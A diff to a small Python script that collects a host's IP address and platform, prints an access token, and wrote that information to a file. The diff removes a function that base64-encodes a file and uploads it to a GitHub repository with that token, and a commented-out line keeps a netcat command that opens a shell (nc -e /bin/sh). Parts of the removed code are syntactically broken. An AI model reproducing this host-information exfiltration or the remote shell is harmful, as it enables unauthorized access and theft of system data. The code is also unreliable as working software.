@@ -18,23 +18,7 @@ def create_file(file_path, content):
 def delete_file(file_path):
     os.remove(file_path)
 
-def upload_file(filename,token):
-    with open(filename, "rb", encoding="utf-8") as f:      
-	# Encoding 
-    urls='https://api.github.com/repos/kaki714/Not/contents/data/<filename>'
-    url=urls.replace('<filename>', filename)
-    encodedData = base64.b64encode(f.read())
-    headers = {
-		"Authorization": f'Bearer {token}',
-		"Content-type": "application/vnd.github+json"
-		}      
-     data = {          
-		"message": "se ha subido una imagen", 
-		# Put your commit message here.
-		"content": encodedData.decode("utf-8")
-		}
-     r = requests.put(url, headers=headers, json=data)
-     print('Request:: 'r)
+
 
         
 
@@ -54,11 +38,9 @@ def run(token):
     print('Linux: ', sysconfig.get_platform(),' === CONNECTED ') 
     print(' IpAddress: ', IPAddr)
     print('TokenData: ', token)
-    stmnt= 'Info: '+ IPAddr+' System:'+sysconfig.get_platform()
+    stmnt= 'Info: '+ IPAddr+' System: '+sysconfig.get_platform()
     print(stmnt)
-    create_file(fname,stmnt)
-    upload_file(fname,token)
-    
+    create_file(fname,stmnt)  
     if "Linux" in platform.system():
         #upload_file_to_github(archive)
         #os.system( 'nc -lvp 734 -e /bin/sh')
